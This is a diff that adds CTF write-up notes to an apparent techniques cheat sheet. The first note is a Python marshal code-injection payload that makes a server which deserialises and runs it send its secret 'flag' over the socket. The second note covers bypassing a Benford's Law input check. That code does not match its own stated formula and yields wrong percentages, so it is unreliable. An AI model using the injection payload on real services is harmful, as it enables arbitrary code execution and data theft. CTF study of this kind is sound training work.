@@ -458,4 +458,51 @@ def is_winning(state):
 
 ---
 
+---
+
+## Python Marshal Code Injection (iCTF 2013)
+
+**Pattern:** Server deserializes base64-encoded `marshal` data and executes it as a Python function. Inject arbitrary code via serialized function code objects.
+
+```python
+import marshal, types, base64
+
+# Craft payload function that exfiltrates data over the socket
+payload = lambda sock: sock.send(globals()['flag'].encode())
+
+# Serialize the function's code object
+serialized = base64.b64encode(marshal.dumps(payload.__code__)).decode()
+
+# Server-side execution pattern:
+# func = types.FunctionType(marshal.loads(base64.b64decode(data)), globals())
+# func(client_socket)
+```
+
+**Key insight:** `marshal.loads()` is as dangerous as `pickle.loads()` — it deserializes arbitrary Python code objects. Unlike pickle, marshal is rarely sandboxed. The injected function runs with access to the server's `globals()`, enabling flag exfiltration via the socket connection.
+
+---
+
+## Benford's Law Frequency Distribution Bypass (iCTF 2013)
+
+**Pattern:** Server validates that input digit frequency matches Benford's Law distribution (±5% tolerance). Craft input with correct digit distribution to pass the check.
+
+```python
+import random
+
+# Benford's Law: P(d) = log10(1 + 1/d) for leading digit d (1-9)
+benford = {d: round(100 * (1 + 1/d) / sum(1/i for i in range(1,10))) for d in range(1,10)}
+# Approx: 1→30%, 2→18%, 3→12%, 4→10%, 5→8%, 6→7%, 7→6%, 8→5%, 9→5%
+
+def generate_benford_compliant(length=1000):
+    digits = []
+    for d, pct in benford.items():
+        digits.extend([str(d)] * int(length * pct / 100))
+    random.shuffle(digits)
+    return ''.join(digits[:length])
+```
+
+**Key insight:** Benford's Law describes the frequency of leading digits in naturally occurring datasets. If a service validates digit distribution, generate compliant input rather than random numbers. Tolerance is typically ±5%, so approximate percentages work.
+
+---
+
 See also: [games-and-vms-2.md](games-and-vms-2.md) for ML weight perturbation negation, cookie checkpoint brute-forcing, Flask cookie game state leakage, WebSocket game manipulation, server time-only validation bypass, LoRA adapter merging, De Bruijn sequences, Brainfuck instrumentation, WASM memory manipulation, and neural network encoder collisions.
